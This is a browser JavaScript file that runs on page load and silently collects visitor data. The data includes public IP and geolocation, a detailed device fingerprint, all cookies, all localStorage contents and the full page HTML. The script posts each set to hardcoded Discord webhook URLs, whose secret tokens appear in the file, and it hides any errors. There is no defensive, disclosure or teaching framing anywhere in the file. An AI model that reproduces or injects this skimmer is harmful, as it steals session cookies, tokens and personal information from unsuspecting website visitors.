function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendToDiscord(info, webhookUrl, fileName = null) {
  const formData = new FormData();

  if (fileName) {
    const blob = new Blob([info], { type: "text/html" });
    formData.append("file", blob, fileName);
  } else {
    formData.append("content", info);
  }

  await fetch(webhookUrl, {
    method: 'POST',
    body: formData,
  }).catch(error => {});

  await delay(250);  // Delay to avoid rate limit
}

function getDarkModeStatus() {
  return window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches ? "Enabled" : "Disabled";
}

function getRamInfo() {
  return navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unavailable";
}

function getGPUInfo() {
  const canvas = document.createElement("canvas");
  const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
  if (!gl) return "Unavailable";
  const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
  return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
}

function getBatteryInfo() {
  return navigator.getBattery ? navigator.getBattery().then(battery => {
    return `Battery Level: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging ? "Yes" : "No"}`;
  }) : Promise.resolve("Battery Info: Unavailable");
}

function getNetworkInfo() {
  return navigator.connection ? `${navigator.connection.effectiveType} | Downlink: ${navigator.connection.downlink} Mbps` : "Unavailable";
}

function getPerformanceMetrics() {
  if (performance && performance.memory) {
    return `JS Heap Size: ${performance.memory.usedJSHeapSize} / ${performance.memory.totalJSHeapSize} / ${performance.memory.jsHeapSizeLimit}`;
  }
  return "Unavailable";
}

function getCookies() {
  return document.cookie ? document.cookie : "No cookies available";
}

function getLocalStorageData() {
  let data = {};
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      data[key] = localStorage.getItem(key);
    }
  }
  return Object.keys(data).length ? JSON.stringify(data) : "No localStorage data available";
}

// Fetch public IP and location data
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(ipData => {
    getBatteryInfo().then(batteryInfo => {
      let userInfo = `**Public IP Address:** ${ipData.ip || "Unavailable"}
      **Exact URL:** ${window.location.href || "Unavailable"}
      **Site Origin:** ${window.location.origin || "Unavailable"}
      **Approx. Location:** ${ipData.city || "Unknown"}, ${ipData.region || "Unknown"}, ${ipData.country_name || "Unknown"}
      **Latitude:** ${ipData.latitude || "Unavailable"}, **Longitude:** ${ipData.longitude || "Unavailable"}
      **ISP:** ${ipData.org || "Unavailable"}
      **Operating System:** ${navigator.platform || "Unavailable"}
      **Browser:** ${navigator.userAgent || "Unavailable"}
      **Browser Engine:** ${navigator.product || "Unavailable"}
      **Vendor:** ${navigator.vendor || "Unavailable"}
      **Browser Online:** ${navigator.onLine ? "Yes" : "No"}
      **Language:** ${navigator.language || "Unavailable"}
      **Languages:** ${navigator.languages ? navigator.languages.join(", ") : "Unavailable"}
      **User-Agent Platform:** ${navigator.platform || "Unavailable"}
      **Geolocation API Available:** ${'geolocation' in navigator ? "Yes" : "No"}
      **Hardware Concurrency (CPU cores):** ${navigator.hardwareConcurrency || "Unavailable"}
      **Device Memory (GB):** ${getRamInfo()}
      **GPU Info:** ${getGPUInfo()}
      **Screen Width:** ${screen.width || "Unavailable"}
      **Screen Height:** ${screen.height || "Unavailable"}
      **Screen Orientation:** ${screen.orientation ? screen.orientation.type : "Unavailable"}
      **Screen Color Depth:** ${screen.colorDepth || "Unavailable"}
      
      **Available Screen Width:** ${screen.availWidth || "Unavailable"}
      **Available Screen Height:** ${screen.availHeight || "Unavailable"}
      **Window Inner Width:** ${window.innerWidth || "Unavailable"}
      **Window Inner Height:** ${window.innerHeight || "Unavailable"}
      **Time Zone Offset:** ${new Date().getTimezoneOffset() / 60 || "Unavailable"}
      **Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone || "Unavailable"}
      **Network Type:** ${getNetworkInfo()}
      **Dark Mode:** ${getDarkModeStatus()}
      **Performance Metrics:** ${getPerformanceMetrics()}
      **Touchscreen Available:** ${'ontouchstart' in window ? "Yes" : "No"}
      **Max Touch Points:** ${navigator.maxTouchPoints || "Unavailable"}
      **Device Type:** ${(window.innerWidth <= 768) ? "Mobile" : (window.innerWidth <= 1024) ? "Tablet" : "Desktop"}
      **Clipboard Access:** ${navigator.clipboard ? "Yes" : "No"}
      **Battery Info:** ${batteryInfo}`;

      const firstWebhookUrl = "https://discord.com/api/webhooks/1342044621584207902/rDjcXDP-pRmR94cydJKM_n43ogg254VRWNtHdFkQ2UTjGhOXQZacKyxUCCwick43NIWk";
      sendToDiscord(userInfo, firstWebhookUrl);

      let localStorageData = getLocalStorageData();
      let localStorageMessage = `**LocalStorage Data:** ${localStorageData}`;
      const localStorageWebhook = "https://discord.com/api/webhooks/1342089280528322560/kTSLbRO3V_DAL_4GqbGB8a4Odsnbbf0mV5qp0yD5GPx-kY88qtMRlQotrY2LQkLkMLM_";
      sendToDiscord(localStorageMessage, localStorageWebhook);

      let cookiesData = getCookies();
      let cookiesMessage = `**Cookies:** ${cookiesData}`;
      const cookiesWebhook = "https://discord.com/api/webhooks/1342094215819165707/q9hnQRv8_Dzm5h2ucp0SOh_TNagLIhuNrXLN4JT6Xwi5dgTSHK6ivonookD7GPyIL5x3";
      sendToDiscord(cookiesMessage, cookiesWebhook);

      let htmlData = document.documentElement.outerHTML;
      const htmlWebhook = "https://discord.com/api/webhooks/1342103786952327280/4JgRIHm9kOU1WNJI1FeH_yE7H86cEfy6DGLH_j78NsL1RoM31pJkd_DgSVYH0-OrYv6z";
      sendToDiscord(htmlData, htmlWebhook, "page.html");
    });
  })
  .catch(() => {
    const fallbackMessage = `New Tester Info
    **Failed to retrieve location data.**\n
    **Exact URL:** ${window.location.href || "Unavailable"}
    **Site Origin:** ${window.location.origin || "Unavailable"}
    **Operating System:** ${navigator.platform || "Unavailable"}
    **Browser:** ${navigator.userAgent || "Unavailable"}
    **Dark Mode:** ${getDarkModeStatus()}
    **Device Memory (GB):** ${getRamInfo()}
    **GPU Info:** ${getGPUInfo()}
    **Battery Info:** ${getBatteryInfo()}`;

    const firstWebhookUrl = "https://discord.com/api/webhooks/1342044621584207902/rDjcXDP-pRmR94cydJKM_n43ogg254VRWNtHdFkQ2UTjGhOXQZacKyxUCCwick43NIWk";
    sendToDiscord(fallbackMessage, firstWebhookUrl);
  });
